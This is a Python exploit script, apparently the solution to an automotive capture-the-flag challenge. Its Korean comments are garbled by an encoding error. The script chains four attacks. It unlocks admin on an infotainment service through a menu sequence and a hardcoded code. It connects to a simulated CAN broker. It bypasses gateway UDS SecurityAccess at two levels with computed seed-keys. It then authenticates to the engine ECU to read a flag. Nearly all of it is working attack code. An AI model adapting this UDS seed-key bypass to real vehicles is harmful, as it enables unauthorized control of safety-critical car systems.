#!/usr/bin/env python3
"""
ê°„ë‹¨í•œ ECU ìµìŠ¤í”Œë¡œì‡ - ì»¨í…Œì´ë„ˆ ë‚´ë¶€ ì „ìš©
í•µì‹¬ ê¸°ëŠ¥ë§Œ í¬í•¨í•œ ê²½ëŸ‰í™” ë²„ì „
"""
import socket
import struct
import json
import time
import os

def exploit_infotainment():
    """Infotainment ECU ìµìŠ¤í”Œë¡œì‡"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 1234))
        
        # Settings â†’ Hidden Auth
        s.recv(1024)
        s.send(b"3\n")
        s.recv(1024)
        s.send(b"9\n")
        
        # Version bypass
        s.recv(1024)
        s.send(b"2.107\n")
        
        # Admin access
        s.recv(1024)
        s.send(b"y\n")
        s.recv(1024)
        s.send(b"132903\n")  # Calculated admin code
        
        response = s.recv(1024)
        s.close()
        
        return b"Full admin privileges unlocked" in response
        
    except Exception as e:
        print(f"Infotainment exploit failed: {e}")
        return False

def connect_can_broker():
    """CAN ë¸Œë¡œì»¤ ì—°ê²°"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('gateway_shared', 9999))
        
        session_id = os.environ.get('SESSION_ID', 'session_test')
        handshake = {
            'session_id': session_id,
            'type': 'infotainment'
        }
        sock.send(json.dumps(handshake).encode())
        sock.recv(1024)  # Handshake response
        
        return sock
        
    except Exception as e:
        print(f"CAN connection failed: {e}")
        return None

def send_can(sock, can_id, data):
    """CAN ë©”ì‹œì§€ ì „ì†¡"""
    msg = {
        'type': 'send',
        'can_id': can_id,
        'data': bytes(data).hex(),
        'timestamp': time.time()
    }
    sock.send((json.dumps(msg) + '\n').encode())

def recv_can(sock, timeout=2):
    """CAN ì‘ë‹µ ìˆ˜ì‹ """
    sock.settimeout(timeout)
    try:
        data = sock.recv(1024).decode().strip()
        return json.loads(data)
    except:
        return None

def gateway_auth(sock):
    """Gateway ì¸ì¦ ìš°íšŒ"""
    try:
        # Level 1 Seed ìš”ì²­ (ì˜¬ë°”ë¥¸ UDS Single Frame)
        send_can(sock, 0x7DF, [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
        
        frame1 = recv_can(sock)
        frame2 = recv_can(sock)
        
        if not frame1 or not frame2:
            return False
        
        # Seed ì¶”ì¶œ
        seed_high = struct.unpack('>H', bytes.fromhex(frame1['data'][6:10]))[0]
        seed_low = struct.unpack('>H', bytes.fromhex(frame2['data'][2:6]))[0]
        seed = (seed_high << 16) | seed_low
        
        # Key ê³„ì‚°
        timestamp = int(time.time()) & 0xFF
        key = ((seed ^ 0xA5A5A5A5) + timestamp) & 0xFFFFFFFF
        
        # Key ì „ì†¡ (UDS Single Frame)
        key_bytes = struct.pack('>I', key)
        send_can(sock, 0x7DF, [0x06, 0x27, 0x02] + list(key_bytes) + [0x00])
        
        auth_response = recv_can(sock)
        if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
            # Level 3 ì¸ì¦ (UDS Single Frame)
            send_can(sock, 0x7DF, [0x02, 0x27, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])
            
            frame1 = recv_can(sock)
            frame2 = recv_can(sock)
            
            if frame1 and frame2:
                seed_high = struct.unpack('>H', bytes.fromhex(frame1['data'][6:10]))[0]
                seed_low = struct.unpack('>H', bytes.fromhex(frame2['data'][2:6]))[0]
                seed = (seed_high << 16) | seed_low
                
                step1 = seed ^ 0x5A5A5A5A
                step2 = ((step1 << 3) | (step1 >> 29)) & 0xFFFFFFFF
                step3 = step2 + ((timestamp & 0xFFFF) * 0x9E3779B9)
                key = step3 & 0xFFFFFFFF
                
                key_bytes = struct.pack('>I', key)
                send_can(sock, 0x7DF, [0x06, 0x27, 0x04] + list(key_bytes) + [0x00])
                
                auth_response = recv_can(sock)
                return auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67
        
        return False
        
    except Exception as e:
        print(f"Gateway auth failed: {e}")
        return False

def engine_exploit(sock):
    """Engine ECU ê³µê²©"""
    try:
        # Diagnostic Session (UDS Single Frame)
        send_can(sock, 0x456, [0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00])
        recv_can(sock)
        
        # Security Access (UDS Single Frame)
        send_can(sock, 0x456, [0x02, 0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00])
        seed_response = recv_can(sock)
        
        if seed_response:
            seed_data = bytes.fromhex(seed_response['data'])
            if len(seed_data) >= 4:
                seed = struct.unpack('>H', seed_data[2:4])[0]
                key = seed ^ 0xCAFE
                
                key_bytes = struct.pack('>H', key)
                send_can(sock, 0x456, [0x04, 0x27, 0x02] + list(key_bytes) + [0x00, 0x00, 0x00])
                
                auth_response = recv_can(sock)
                if auth_response and bytes.fromhex(auth_response['data'])[1] == 0x67:
                    # í”Œë˜ê·¸ ì½ê¸° (UDS Single Frame)
                    send_can(sock, 0x456, [0x03, 0x22, 0xF1, 0xA0, 0x00, 0x00, 0x00, 0x00])
                    
                    flag_response = recv_can(sock)
                    if flag_response:
                        flag_data = bytes.fromhex(flag_response['data'])
                        if len(flag_data) >= 3:
                            flag = flag_data[3:].decode('utf-8', errors='ignore')
                            return flag
        
        return None
        
    except Exception as e:
        print(f"Engine exploit failed: {e}")
        return None

def main():
    print("ğŸš— Simple ECU Exploit")
    print("=" * 30)
    
    # 1. Infotainment ìµìŠ¤í”Œë¡œì‡
    print("[1] Exploiting infotainment...")
    if not exploit_infotainment():
        print("âŒ Infotainment exploit failed")
        return
    print("âœ… Infotainment exploited")
    
    # 2. CAN ë¸Œë¡œì»¤ ì—°ê²°
    print("[2] Connecting to CAN broker...")
    sock = connect_can_broker()
    if not sock:
        print("âŒ CAN connection failed")
        return
    print("âœ… CAN broker connected")
    
    # 3. Gateway ì¸ì¦
    print("[3] Bypassing gateway...")
    if not gateway_auth(sock):
        print("âŒ Gateway bypass failed")
        return
    print("âœ… Gateway bypassed")
    
    # 4. Engine ê³µê²©
    print("[4] Attacking engine ECU...")
    flag = engine_exploit(sock)
    if flag:
        print(f"ğŸ‰ SUCCESS! Flag: {flag}")
    else:
        print("âŒ Engine attack failed")
    
    sock.close()

if __name__ == "__main__":
    main()